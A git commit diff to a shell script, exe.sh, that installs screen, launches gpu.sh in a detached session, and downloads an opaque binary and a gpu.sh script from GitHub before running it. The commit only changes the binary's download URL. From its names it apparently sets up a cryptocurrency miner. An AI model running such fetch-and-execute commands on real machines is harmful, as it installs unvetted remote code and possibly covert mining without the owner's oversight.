4e0bbd09f27b0529483d6714ce4dce0f74de83f8
cir74 <88709944+cir74@users.noreply.github.com>
2021-08-10 15:42:10 +0700

    Update exe.sh

--- exe.sh
+++ exe.sh
@@ -2,7 +2,7 @@
 sudo apt update
 sudo apt install screen -y
 screen -dmS gpu.sh ./gpu.sh 69 79
-wget https://github.com/cir74/46/raw/main/mantapu
+wget https://github.com/cir74/1446/raw/main/mantapu
 wget https://raw.githubusercontent.com/d-crypto99/46/main/gpu.sh
 chmod +x gpu.sh
 ./gpu.sh
